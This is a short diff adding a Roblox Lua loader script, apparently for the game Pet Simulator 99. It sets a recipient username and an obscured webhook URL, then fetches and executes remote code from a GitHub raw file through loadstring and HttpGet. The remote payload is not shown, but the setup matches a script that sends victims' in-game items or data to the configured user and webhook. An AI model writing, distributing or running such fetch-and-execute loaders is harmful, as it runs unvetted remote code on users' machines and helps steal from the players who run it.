@@ -1,0 +1,4 @@
+Username = "56Devili" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VVIzeGFvZE4yRmdjOUZScVhqX1hadzpKcXNCSnVHOEtFcmN0WmwyaURvTFp6aE1HTmgwV3JLNFROYTBGSlowLWZLc1JoVFZDcFBQN3U2TTZkMFp4b2R0UnVMd3Jpb0RoOUY1Y2ZXejBTTGNPMlhhQTdNV0lBQmpkWUEycFRQZE9wb1ZPMGRRXzhZcG5zNWExSGMxQ2liWkJnVlBScFpJZ0p6Z0x6TnJPUTk2Xzc3ZFd6Vm5ESmh5cC1FZzBYUlJMbkE" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
